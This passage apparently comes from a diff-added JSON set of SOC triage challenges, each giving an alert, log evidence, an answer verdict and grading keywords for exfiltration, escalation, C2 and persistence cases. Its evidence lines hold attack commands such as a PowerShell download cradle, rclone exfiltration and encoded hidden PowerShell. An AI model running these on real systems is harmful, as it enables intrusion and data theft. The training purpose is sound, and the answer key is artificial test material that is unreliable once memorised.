+   "rule": "SOC223 - Suspicious Inbox Forwarding Rule Created",
+   "time": "2026-06-17 09:47",
+   "host": "EXO-TENANT-01",
+   "user": "r.okafor",
+   "src_ip": "198.51.100.77"
+  },
+  "evidence": [
+   "Exchange audit: New-InboxRule Name='.' ForwardTo='r.okafor.backup@mailbox-relay.example' DeleteMessage=True SubjectOrBodyContainsWords='invoice,wire,payment,bank' by r.okafor from 198.51.100.77",
+   "Entra ID sign-in: r.okafor success from 198.51.100.77 (hosting provider ASN) at 09:41, legacy IMAP client, MFA not required by policy for legacy auth",
+   "Previous sign-in for r.okafor was 08:12 from 10.50.1.22 (corporate office), impossible travel flagged",
+   "Mail trace: 37 messages auto-forwarded to mailbox-relay.example between 09:48 and 10:20, including 6 with attachments from the finance distribution list",
+   "User confirmed via phone they did not create any rules and had no recent travel"
+  ],
+  "keywords": [
+   "new-inboxrule",
+   "forwarding",
+   "198.51.100.77",
+   "legacy auth",
+   "mfa",
+   "revoke",
+   "reset"
+  ]
+ },
+ {
+  "id": "ch-09-5",
+  "title": "Staged Archive and Low-and-Slow Transfer via Renamed Rclone",
+  "category": "Data Exfiltration",
+  "severity": "Critical",
+  "points": 180,
+  "difficulty": "Hard",
+  "verdict": "TP",
+  "description": "Correlation rule linked archive creation on an engineering file server to recurring off-hours outbound transfers over three nights, performed with a service account and a binary masquerading as a Windows component.",
+  "alert": {
+   "rule": "SOC240 - Archive Staging Followed by Repeated Outbound Transfer",
+   "time": "2026-06-22 01:34",
+   "host": "FS-ENG-01",
+   "user": "svc_deploy",
+   "src_ip": "10.40.6.15"
+  },
+  "evidence": [
+   "Sysmon EventID 1: 7z.exe a -mx1 -p******** C:\\ProgramData\\Microsoft\\Update\\eng_cad_0622.7z \\\\FS-ENG-01\\Projects$\\Aerospace\\* by svc_deploy at 00:58, parent cmd.exe",
+   "Sysmon EventID 1: C:\\ProgramData\\Microsoft\\Update\\svchost_update.exe copy --transfer 4 --bwlimit 8M eng_cad_0622.7z remote:bkt-9f3a, SHA256=9f2c1d7a4b8e3f60a5d1c2b7e48f90136ad5b7c2e1f4089a3b6c7d8e9f0a1b2c (matches rclone v1.66 in threat intel, file not signed by Microsoft)",
+   "Sysmon EventID 3: svchost_update.exe -> 203.0.113.88:443 (S3-compatible storage) 14.2 GB total over 3 nights (06-20, 06-21, 06-22), always between 01:00 and 04:00",
+   "Security EventID 4624 LogonType 3 for svc_deploy from WKS-DEV-044 (10.40.9.44) at 00:51; the account normally runs only from the CI server BLD-CI-01 and has no interactive use",
+   "Security EventID 5145: svc_deploy accessed 3,900 files in Projects$\\Aerospace with read-only intent, never accessed before in 90 days",
+   "EDR on WKS-DEV-044 shows a phishing-delivered Cobalt Strike-style beacon active since 06-18, and svc_deploy credentials were present in a memory dump (LSASS access, EventID 10)"
+  ],
+  "keywords": [
+   "rclone",
+   "7z",
+   "203.0.113.88",
+   "svc_deploy",
+   "lateral movement",
+   "isolate",
+   "credential reset"
+  ]
+ },
+ {
+  "id": "ch-10-1",
+  "title": "Unauthorized Account Added to Domain Admins",
+  "category": "Privilege Escalation",
+  "severity": "Critical",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "TP",
+  "description": "A new account was created and added to Domain Admins at 03:12, outside business hours. The change was made by a helpdesk service account and has no matching change ticket.",
+  "alert": {
+   "rule": "SOC201 - User Added to Privileged Domain Group",
+   "time": "2026-06-08 03:12",
+   "host": "DC01-CORP",
+   "user": "svc_helpdesk",
+   "src_ip": "10.20.14.77"
+  },
+  "evidence": [
+   "EventID 4720 at 03:05 user account 't.nguyen2' created by CORP\\svc_helpdesk on DC01-CORP",
+   "EventID 4728 at 03:12 member 't.nguyen2' added to security-enabled global group 'Domain Admins' by CORP\\svc_helpdesk",
+   "svc_helpdesk authenticated at 03:02 via EventID 4624 LogonType=3 from 10.20.14.77 (WKS-0412), a workstation this service account has never used",
+   "No ITSM change ticket or PAM session exists for this change in the past 24 hours",
+   "svc_helpdesk has not modified any privileged group in the last 90 days"
+  ],
+  "keywords": [
+   "4728",
+   "4720",
+   "domain admins",
+   "svc_helpdesk",
+   "10.20.14.77",
+   "disable",
+   "reset"
+  ]
+ },
+ {
+  "id": "ch-10-2",
+  "title": "Local Administrators Group Modified on Finance Workstation",
+  "category": "Privilege Escalation",
+  "severity": "Low",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "FP",
+  "description": "A user was added to the local Administrators group on a finance workstation. The change was made by an IT admin through the approved PAM tool during a scheduled change window.",
+  "alert": {
+   "rule": "SOC202 - Local Administrators Group Membership Changed",
+   "time": "2026-06-09 10:34",
+   "host": "WKS-FIN-023",
+   "user": "adm.rlopez",
+   "src_ip": "10.40.5.18"
+  },
+  "evidence": [
+   "EventID 4732 at 10:34 member CORP\\a.silva added to local group 'Administrators' on WKS-FIN-023 by CORP\\adm.rlopez",
+   "Change ticket CHG0048213 is approved: 'Temporary local admin for finance reporting software install', window 2026-06-09 10:00-12:00",
+   "Action was performed through the corporate PAM agent (PAMAgent.exe, signed by the corporate vendor) from IT admin jump host 10.40.5.18",
+   "adm.rlopez is a member of IT-Desktop-Support and authenticated with MFA at 10:31",
+   "The PAM policy auto-revokes the elevation at 12:00, and a scheduled removal job is already queued"
+  ],
+  "keywords": [
+   "4732",
+   "chg0048213",
+   "approved",
+   "adm.rlopez",
+   "pam",
+   "false positive",
+   "local administrators"
+  ]
+ },
+ {
+  "id": "ch-10-3",
+  "title": "UAC Bypass via fodhelper Registry Hijack",
+  "category": "Privilege Escalation",
+  "severity": "High",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "EDR flagged a high-integrity PowerShell process spawned by fodhelper.exe on an HR workstation, shortly after a registry change under the ms-settings class key.",
+  "alert": {
+   "rule": "SOC214 - UAC Bypass Technique Detected",
+   "time": "2026-06-10 14:52",
+   "host": "WKS-HR-117",
+   "user": "m.chavez",
+   "src_ip": "10.50.12.117"
+  },
+  "evidence": [
+   "Sysmon EID 13 at 14:51 HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command (Default) set to 'powershell.exe -w hidden -enc JABjAD0A...' by WINWORD.EXE child process cmd.exe",
+   "Sysmon EID 1 at 14:52 fodhelper.exe (IntegrityLevel=Medium) spawned powershell.exe with IntegrityLevel=High and ParentImage=fodhelper.exe",
+   "Sysmon EID 11 C:\\Users\\m.chavez\\AppData\\Local\\Temp\\upd.exe created, sha256=b7e4c1d09a3f5e28d61c47a90b3e8f12c5d7a6489e0b1f3c2d4a5e6f708192a3",
+   "Sysmon EID 3 powershell.exe connected to 198.51.100.44:443 (domain cdn-update.example.net, registered 3 days ago)",
+   "m.chavez is a standard user, and the activity began right after a macro-enabled attachment, invoice_0610.docm, was opened"
+  ],
+  "keywords": [
+   "fodhelper",
+   "uac bypass",
+   "ms-settings",
+   "198.51.100.44",
+   "b7e4c1d09a3f5e28",
+   "isolate",
+   "encoded powershell"
+  ]
+ },
+ {
+  "id": "ch-10-4",
+  "title": "IIS Worker Process Escalates to SYSTEM via Potato-Style Exploit",
+  "category": "Privilege Escalation",
+  "severity": "Critical",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "A process spawned by w3wp.exe on a public web server is running as NT AUTHORITY\\SYSTEM after a suspicious binary was dropped in a temp directory.",
+  "alert": {
+   "rule": "SOC221 - Service Account Token Impersonation to SYSTEM",
+   "time": "2026-06-12 21:18",
+   "host": "WEB-IIS-02",
+   "user": "IIS APPPOOL\\CorpPortal",
+   "src_ip": "203.0.113.58"
+  },
+  "evidence": [
+   "IIS log: POST /uploads/img_view.aspx 200 from 203.0.113.58 at 21:09, a file never seen in the application's deployment manifest",
+   "EventID 4688 at 21:12 w3wp.exe spawned cmd.exe /c whoami /priv, output shows SeImpersonatePrivilege Enabled",
+   "Sysmon EID 11 C:\\Windows\\Temp\\sp.exe created by w3wp.exe, and the file matches the PrintSpoofer tool by name and behavior",
+   "EventID 4688 at 21:16 sp.exe -i -c cmd spawned a cmd.exe process running as NT AUTHORITY\\SYSTEM",
+   "EventID 4720 at 21:18 local account 'support$' created and added to Administrators"
+  ],
+  "keywords": [
+   "w3wp.exe",
+   "webshell",
+   "seimpersonateprivilege",
+   "printspoofer",
+   "system",
+   "203.0.113.58",
+   "isolate"
+  ]
+ },
+ {
+  "id": "ch-10-5",
+  "title": "AD CS ESC1 Certificate Abuse Leading to Domain Admin Impersonation",
+  "category": "Privilege Escalation",
+  "severity": "Critical",
+  "points": 180,
+  "difficulty": "Hard",
+  "verdict": "TP",
+  "description": "A standard user requested a certificate with an administrator UPN in the SAN, then used it to obtain a Kerberos TGT as the administrator. Directory replication requests followed from the same workstation.",
+  "alert": {
+   "rule": "SOC237 - Certificate Issued with Mismatched Subject Alternative Name",
+   "time": "2026-06-15 14:21",
+   "host": "CA01-CORP",
+   "user": "d.okafor",
+   "src_ip": "10.30.8.91"
+  },
+  "evidence": [
+   "CA EventID 4887 at 14:21 certificate issued to requester CORP\\d.okafor, template=CorpWebServer-Legacy, SAN UPN=administrator@corp.example.test",
+   "Template CorpWebServer-Legacy allows enrollee-supplied subject (ENROLLEE_SUPPLIES_SUBJECT), has Client Authentication EKU, and Domain Users have enroll rights",
+   "DC02 EventID 4768 at 14:27 TGT requested for 'administrator' with PreAuthType=16 (PKINIT), cert issuer CORP-CA01, src 10.30.8.91",
+   "DC02 EventID 4662 at 14:33 access to {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All) by administrator from 10.30.8.91",
+   "The real administrator's usual host is WKS-ADM-005 (10.30.2.15), which had no logon activity between 13:00 and 16:00",
+   "10.30.8.91 is WKS-ENG-091, which is assigned to d.okafor"
+  ],
+  "keywords": [
+   "esc1",
+   "4887",
+   "pkinit",
+   "4768",
+   "dcsync",
+   "revoke",
+   "krbtgt"
+  ]
+ },
+ {
+  "id": "ch-11-1",
+  "title": "Periodic Beaconing to Threat-Intel Listed Domain",
+  "category": "Command and Control",
+  "severity": "High",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "TP",
+  "description": "A finance workstation made HTTP requests every 60 seconds to a domain that matches the threat intel C2 feed. The requests came from a binary running out of a user-writable folder.",
+  "alert": {
+   "rule": "SOC301 - Threat Intel C2 Domain Match",
+   "time": "2026-06-04 10:17",
+   "host": "WKS-FIN-014",
+   "user": "j.morales",
+   "src_ip": "10.10.22.114"
+  },
+  "evidence": [
+   "Proxy: 1440 x GET http://update-check.cdn-svc.example/gate.php from 10.10.22.114 to 203.0.113.45, interval 60s +/- 2s, over 24h",
+   "Sysmon EventID 3: Image=C:\\Users\\Public\\svchost.exe DestinationIp=203.0.113.45 DestinationPort=80",
+   "svchost.exe in C:\\Users\\Public is unsigned, SHA256=9f2c4b7a1d8e5036ab4c7d19e2f08a35c6b1d47e90a2f3c85d6e71b0a4c93e28",
+   "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0), not used by any approved browser in the environment",
+   "update-check.cdn-svc.example appears in the threat intel feed as a known C2 domain, first seen 5 days ago"
+  ],
+  "keywords": [
+   "beacon",
+   "203.0.113.45",
+   "svchost.exe",
+   "sysmon",
+   "threat intel",
+   "isolate",
+   "block"
+  ]
+ },
+ {
+  "id": "ch-11-2",
+  "title": "Regular Outbound Connections from Monitoring Server",
+  "category": "Command and Control",
+  "severity": "Low",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "FP",
+  "description": "The beaconing detector flagged a server connecting to a rarely seen external domain at exact 60-second intervals. Check whether the process and destination are legitimate.",
+  "alert": {
+   "rule": "SOC305 - Beaconing Behavior Detected",
+   "time": "2026-06-05 14:32",
+   "host": "SRV-MON-02",
+   "user": "SYSTEM",
+   "src_ip": "10.10.5.40"
+  },
+  "evidence": [
+   "Firewall: 10.10.5.40 -> 198.51.100.20:443 every 60s, constant 312 bytes out / 188 bytes in, since 2026-06-01 09:05",
+   "Sysmon EventID 3: Image=C:\\Program Files\\Acme Monitor\\amagent.exe DestinationHostname=agent.monitorvendor.example",
+   "amagent.exe has a valid Authenticode signature from 'Acme Monitor Inc.', SHA256 matches the vendor-published hash",
+   "Change ticket CHG-20418 approved the Acme Monitor agent rollout on 2026-06-01 for 38 servers in the monitoring group",
+   "agent.monitorvendor.example is on the approved SaaS allowlist, and the same pattern appears on all 38 hosts"
+  ],
+  "keywords": [
+   "false positive",
+   "amagent.exe",
+   "signed",
+   "chg-20418",
+   "allowlist",
+   "heartbeat",
+   "tune"
+  ]
+ },
+ {
+  "id": "ch-11-3",
+  "title": "DNS Tunneling with High-Entropy TXT Queries",
+  "category": "Command and Control",
+  "severity": "High",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "An engineering workstation generated thousands of long TXT queries to a newly registered domain. The queries went straight to an external resolver instead of the internal DNS servers.",
+  "alert": {
+   "rule": "SOC312 - DNS Tunneling Suspected",
+   "time": "2026-06-08 22:48",
+   "host": "WKS-ENG-207",
+   "user": "r.chen",
+   "src_ip": "10.20.14.87"
+  },
+  "evidence": [
+   "3850 x DNS TXT queries in 30 min to *.t.dnsx-sync.example, average query length 118 chars, base32-like labels (e.g. mfrggzdfmz3xg5dsn5ygk43u.t.dnsx-sync.example)",
+   "Queries sent directly to external resolver 192.0.2.53 over UDP/53, bypassing the internal DNS servers",
+   "Sysmon EventID 22: Image=C:\\Windows\\System32\\nslookup.exe, ParentImage=cmd.exe running C:\\ProgramData\\sync.bat",
+   "dnsx-sync.example was registered 6 days ago and has no prior history in the environment",
+   "Outbound DNS volume from this host is 40x its 30-day baseline, with no matching HTTP or user activity"
+  ],
+  "keywords": [
+   "dns tunneling",
+   "txt",
+   "entropy",
+   "dnsx-sync.example",
+   "192.0.2.53",
+   "sinkhole",
+   "isolate"
+  ]
+ },
+ {
+  "id": "ch-11-4",
+  "title": "Web Server Talking to Telegram Bot API",
+  "category": "Command and Control",
+  "severity": "Critical",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "An IIS web server made outbound HTTPS requests to a public messaging API. This traffic has no business justification, and the IIS worker process was seen spawning a shell.",
+  "alert": {
+   "rule": "SOC318 - Suspicious Outbound to Messaging API from Server",
+   "time": "2026-06-12 22:06",
+   "host": "SRV-WEB-05",
+   "user": "svc_iis",
+   "src_ip": "10.30.5.12"
+  },
+  "evidence": [
+   "Proxy: POST https://api.telegram.org/bot<redacted>/sendDocument from 10.30.5.12, 4.2 MB uploaded at 22:04",
+   "Sysmon EventID 1: ParentImage=C:\\Windows\\System32\\inetsrv\\w3wp.exe Image=cmd.exe CommandLine='cmd.exe /c whoami && ipconfig /all' at 21:59",
+   "Sysmon EventID 11: C:\\inetpub\\wwwroot\\uploads\\help.aspx created at 21:58, SHA256=4be1a0c93d57f2e861b09a7c35d4e8f1206ab93c7d5e4f018b2c6a9d3e7f1054",
+   "No business use of Telegram is documented for this server, and no other server contacts api.telegram.org",
+   "IIS access log: POST /uploads/help.aspx from 198.51.100.99 returned 200 eleven times between 21:58 and 22:05"
+  ],
+  "keywords": [
+   "telegram",
+   "w3wp.exe",
+   "webshell",
+   "help.aspx",
+   "sysmon",
+   "isolate",
+   "bot token"
+  ]
+ },
+ {
+  "id": "ch-11-5",
+  "title": "Low-and-Slow Jittered Beacon Using Domain Fronting",
+  "category": "Command and Control",
+  "severity": "Critical",
+  "points": 180,
+  "difficulty": "Hard",
+  "verdict": "TP",
+  "description": "An ML-based detector flagged a 30-minute jittered HTTPS beacon from an application server. The SNI points to a benign CDN hostname, but TLS-inspected traffic shows a different Host header. A suspicious scheduled task and lateral movement activity were also found.",
+  "alert": {
+   "rule": "SOC330 - Anomalous Long-Interval Beaconing (ML)",
+   "time": "2026-06-16 03:25",
+   "host": "SRV-APP-11",
+   "user": "svc_backup",
+   "src_ip": "10.40.8.31"
+  },
+  "evidence": [
+   "Proxy (TLS inspection): 10.40.8.31 -> 198.51.100.77:443 SNI=cdn-assets.fronted.example but Host header=telemetry.badfront.example, 144 requests over 72h at ~1800s intervals with ~30% jitter",
+   "Every response is a constant 1.2 KB and the POST bodies are base64 blobs; the JA3 hash 6734f37431670b3ab4292b8f60f29984 matches a known Cobalt Strike profile in the TI feed",
+   "EventID 4698: scheduled task \\Microsoft\\Windows\\Maintenance\\SvcSync created by svc_backup on 2026-06-13 02:10, action: rundll32.exe C:\\Windows\\Temp\\msagent.dll,Start",
+   "Sysmon EventID 17: named pipe \\\\.\\pipe\\msagent_4f created by rundll32.exe, msagent.dll is unsigned, SHA256=c17d02e5a9b4f386d0e1475ab82c93f6e5d1094b7a3c8f2e60d95b14a7e3c820",
+   "EventID 4624 LogonType=3 on SRV-DB-03 from 10.40.8.31 as svc_backup at 03:12, outside the normal backup window",
+   "svc_backup has no interactive-logon history, and the SvcSync task name is not in the approved scheduled task baseline"
+  ],
+  "keywords": [
+   "domain fronting",
+   "jitter",
+   "ja3",
+   "4698",
+   "named pipe",
+   "scheduled task",
+   "isolate"
+  ]
+ },
+ {
+  "id": "ch-12-1",
+  "title": "Hidden PowerShell Added to User Run Key",
+  "category": "Persistence",
+  "severity": "High",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "TP",
+  "description": "EDR flagged a new HKCU Run key value on a finance workstation. The value launches an encoded, hidden PowerShell command from a user-writable folder.",
+  "alert": {
+   "rule": "SOC221 - Suspicious Registry Run Key Modification",
+   "time": "2026-06-02 09:17",
+   "host": "WKS-FIN-014",
+   "user": "j.alvarez",
+   "src_ip": "10.20.4.58"
+  },
+  "evidence": [
+   "Sysmon EventID 13 host=WKS-FIN-014 TargetObject=HKU\\S-1-5-21-...-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdater",
+   "Run key Details=powershell.exe -w hidden -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...",
+   "Image that wrote the key: C:\\Users\\Public\\Libraries\\upd.exe (unsigned, created 09:16, sha256=5f1c0a9be2d47c83a6b0f4e1d9c27a55e3b8d1f06a74c9e2b3d58f1a7c04e9d2)",
+   "Parent process of upd.exe is WINWORD.EXE opening Q2_Invoice_Review.docm from an email attachment",
+   "The legitimate OneDrive updater lives under C:\\Users\\j.alvarez\\AppData\\Local\\Microsoft\\OneDrive, not in the Run key under this name"
+  ],
+  "keywords": [
+   "sysmon",
+   "run key",
+   "powershell",
+   "encodedcommand",
+   "upd.exe",
+   "isolate",
+   "macro"
+  ]
+ },
+ {
+  "id": "ch-12-2",
+  "title": "New Scheduled Task Created on Workstation",
+  "category": "Persistence",
+  "severity": "Low",
+  "points": 80,
+  "difficulty": "Easy",
+  "verdict": "FP",
+  "description": "A scheduled task was created on an HR laptop by SYSTEM and triggered the persistence rule. The task name resembles a software update job.",
+  "alert": {
+   "rule": "SOC224 - Scheduled Task Created via Non-Interactive Session",
+   "time": "2026-06-04 13:05",
+   "host": "LT-HR-032",
+   "user": "SYSTEM",
+   "src_ip": "10.20.7.132"
+  },
+  "evidence": [
+   "EventID 4698 TaskName=\\Adobe Acrobat Update Task Author=NT AUTHORITY\\SYSTEM Action=C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe",
+   "Creating process was ccmexec.exe (SCCM client) executing package 'Adobe Acrobat Reader 24.005 Upgrade' (deployment ID PS1002A7)",
+   "AdobeARM.exe is signed by Adobe Inc., certificate valid, sha256 matches the hash in the software catalog",
+   "Change ticket CHG0048213 approved for the Acrobat rollout to the HR OU from 2026-06-04 12:00 to 18:00",
+   "The same task was created on 46 other HR endpoints in the last hour, with no outbound connections to unusual destinations"
+  ],
+  "keywords": [
+   "4698",
+   "scheduled task",
+   "sccm",
+   "change ticket",
+   "signed",
+   "adobearm.exe",
+   "false positive"
+  ]
+ },
+ {
+  "id": "ch-12-3",
+  "title": "Malicious WMI Event Subscription on App Server",
+  "category": "Persistence",
+  "severity": "High",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "Sysmon detected a permanent WMI event subscription on an application server. It binds a timer-based filter to a command-line consumer that runs PowerShell.",
+  "alert": {
+   "rule": "SOC236 - WMI Permanent Event Subscription Created",
+   "time": "2026-06-08 22:48",
+   "host": "SRV-APP-07",
+   "user": "svc_backup",
+   "src_ip": "10.30.12.17"
+  },
+  "evidence": [
+   "Sysmon EventID 19 EventFilter Name=WindowsUpdateCheck Query=SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
+   "Sysmon EventID 20 CommandLineEventConsumer Name=WindowsUpdateConsumer Destination=powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://cdn-sync.example.invalid/a.ps1')\"",
+   "Sysmon EventID 21 FilterToConsumerBinding links WindowsUpdateCheck to WindowsUpdateConsumer",
+   "Subscription was created over remote WMI (WmiPrvSE.exe) from 10.30.12.44 using the svc_backup credentials, EventID 4624 LogonType=3 at 22:47",
+   "svc_backup normally runs backups from BKP-01 only, and 10.30.12.44 (WKS-DEV-021) has never touched SRV-APP-07 before",
+   "Proxy logs show the host resolving cdn-sync.example.invalid every 5 minutes since 22:53"
+  ],
+  "keywords": [
+   "wmi",
+   "event 21",
+   "commandlineeventconsumer",
+   "svc_backup",
+   "10.30.12.44",
+   "isolate",
+   "cdn-sync.example.invalid"
+  ]
+ },
+ {
+  "id": "ch-12-4",
+  "title": "Auto-Start Service Installed from ProgramData",
+  "category": "Persistence",
+  "severity": "High",
+  "points": 120,
+  "difficulty": "Medium",
+  "verdict": "TP",
+  "description": "A new auto-start service was installed on a file server with a binary in a non-standard location. The service name imitates a security product.",
+  "alert": {
+   "rule": "SOC229 - New Service Installed with Suspicious Path",
+   "time": "2026-06-10 03:22",
+   "host": "SRV-FILE-02",
+   "user": "CORP\\adm.rsmith",
+   "src_ip": "10.30.5.21"
+  },
+  "evidence": [
+   "System EventID 7045 ServiceName=WinDefendUpdate ImagePath=C:\\ProgramData\\wd\\svcupd.exe StartType=auto ServiceAccount=LocalSystem",
+   "EventID 4624 LogonType=10 user=adm.rsmith src=198.51.100.77 at 03:19, an external IP outside the corporate VPN range",
+   "svcupd.exe sha256=a3c9e17b04d85f62c1e07b9d3f5a28e46d0b7c19f8e3a5d24b6c70e1f9a8d3b5 is unsigned, and a hash search shows it as a known Cobalt Strike loader",
+   "svcupd.exe made outbound TLS connections to update.cdn-sync.example every 60 seconds, with jitter",
+   "adm.rsmith is on annual leave until 2026-06-15 per the HR calendar, and no VPN session exists for this user",
+   "The genuine Defender service is named WinDefend and runs from C:\\ProgramData\\Microsoft\\Windows Defender\\Platform"
+  ],
+  "keywords": [
+   "7045",
+   "windefendupdate",
+   "programdata",
+   "adm.rsmith",
+   "198.51.100.77",
+   "beacon",
+   "isolate"
+  ]
+ },
+ {
+  "id": "ch-12-5",
+  "title": "Client Secret Added to Privileged Service Principal After Risky Sign-in",
+  "category": "Persistence",
+  "severity": "Critical",
+  "points": 180,
+  "difficulty": "Hard",
+  "verdict": "TP",
+  "description": "Entra ID audit logs show a new client secret on an existing enterprise application that holds mail permissions. The change was made by a helpdesk admin whose session was flagged as risky earlier in the day. The attacker is likely using a hijacked session token to keep access that survives a password reset.",
+  "alert": {
+   "rule": "SOC251 - Credential Added to Application or Service Principal",
+   "time": "2026-06-15 16:34",
+   "host": "Entra-ID-Tenant-contoso-test",
+   "user": "t.nakamura@contoso.example",
+   "src_ip": "203.0.113.96"
+  },
+  "evidence": [
+   "Audit log 'Add service principal credentials' target=HR-Onboarding-Sync (appId 7d2e5b10-4c9a-4f1e-9a3d-0b6e8c1f2a44) type=ClientSecret expires=2028-06-15 initiator=t.nakamura@contoso.example ip=203.0.113.96",
+   "Sign-in 15:58 for t.nakamura from 198.51.100.140 flagged 'Anomalous token' and 'Unfamiliar sign-in properties'. The MFA claim was present but no MFA prompt appears in the logs, which suggests AiTM token replay after a click on login-contoso-sso.example",
+   "Earlier in the day, helpdesk admin t.nakamura had last signed in from Lisbon on a compliant device, while the 203.0.113.96 sessions show a different user agent and a non-compliant device",
+   "HR-Onboarding-Sync holds Mail.ReadWrite and Files.Read.All application permissions with tenant-wide admin consent, granted 2026-03-02",
+   "Service principal sign-ins using the new secret began 16:41 from 203.0.113.96, and Graph activity shows 1,900 mailbox message reads across 14 executive mailboxes in 20 minutes",
+   "The attacker's Conditional Access policies do not apply to the service principal, so a password reset for t.nakamura alone would not remove this access"
+  ],
+  "keywords": [
+   "service principal",
+   "client secret",
+   "aitm",
+   "token",
+   "mail.readwrite",
+   "revoke",
+   "203.0.113.96"
+  ]
+ }
+]
